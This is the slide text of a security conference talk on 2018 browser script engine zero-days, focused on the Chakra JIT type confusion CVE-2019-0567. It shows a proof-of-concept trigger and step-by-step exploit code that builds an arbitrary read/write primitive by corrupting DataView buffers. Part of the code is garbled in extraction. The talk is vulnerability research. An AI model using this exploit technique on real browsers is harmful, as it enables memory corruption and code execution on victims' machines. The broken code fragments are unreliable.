From: https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=CVE-2019-0567
创建两个对象
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567 : 根本原因分析
function opt(obj1, obj2) {
obj1.b = 1;
let tmp = {__proto__:obj2}; 
obj1.a = 0x1234;
}
obj1 = {a:1, b:2 };
obj2 = {};
for(let i=0; iauxSlots = obj3
opt(obj1, obj1, obj3);
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567 : 漏洞利用
•
Exploit Memory Layout – R/W Primitive
vtable
type
auxslots
vtable
type
auxslots
vtable
type
auxslots
objectArray
objectArray
objectArray
length
arrayBuffer
byteOffset
buffer
vtable
type
auxslots
objectArray
length
arrayBuffer
byteOffset
buffer
obj1 (DynamicObject)
obj3 (DynamicObject)
dv1 (DataView)
dv2 (DataView)
obj1.a
obj1.b
obj1.c
obj3.a
obj3.b
obj3.c
obj3.d
obj3.e
obj3.f
obj3.g
obj3.h
Step2. Set obj3->auxSlots = dv1
obj1.c = dv1; 
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567 : 漏洞利用
•
Exploit Memory Layout – R/W Primitive
vtable
type
auxslots
vtable
type
auxslots
vtable
type
auxslots
objectArray
objectArray
objectArray
length
arrayBuffer
byteOffset
buffer
vtable
type
auxslots
objectArray
length
arrayBuffer
byteOffset
buffer
obj1 (DynamicObject)
obj3 (DynamicObject)
dv1 (DataView)
dv2 (DataView)
obj1.a
obj1.b
obj1.c
obj3.a
obj3.b
obj3.c
obj3.d
obj3.e
obj3.f
obj3.g
obj3.h
Step3. Set dv1->buffer = dv2
obj3.h = dv2;
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567 : 漏洞利用
•
Exploit Memory Layout – R/W Primitive
vtable
type
auxslots
vtable
type
auxslots
vtable
type
auxslots
objectArray
objectArray
objectArray
length
arrayBuffer
byteOffset
buffer
vtable
type
auxslots
objectArray
length
arrayBuffer
byteOffset
buffer
obj1 (DynamicObject)
obj3 (DynamicObject)
dv1 (DataView)
dv2 (DataView)
obj1.a
obj1.b
obj1.c
obj3.a
obj3.b
obj3.c
obj3.d
obj3.e
obj3.f
obj3.g
obj3.h
Step4. Get arbitrary R/W primitive 
by corrupting dv2's buffer
dv1.setUint32(0x38, addr_lo, true);
dv1.setUint32(0x3c, addr_hi, true)
Chakra JIT Type Confusion 
• 案例分析: CVE-2019-0567 : 漏洞利用
•
Leak chakra base address
Demo
结论
• Flash仍然是攻击者的主要目标。 由于Adobe将在2020年底停止更新Flash，
Flash零日漏洞攻击的数量可能会减少。
• 在2018年，一些旧的脚本引擎开始成为攻击者的目标，例如VBScript和JScript。
未来可能会在这些脚本引擎中发现更多的零日漏洞攻击。
• VBSEmulator可用于执行一些vbscript反混淆并检测可能的未知漏洞。
• 新的JavaScript引擎Chakra似乎很脆弱，尤其是JIT编译器。 类型混淆易于利用。
谢谢!
Browser Script Engine Zero Days in 2018
@elli0tn0phacker
Elliot Cao
PI:EMAIL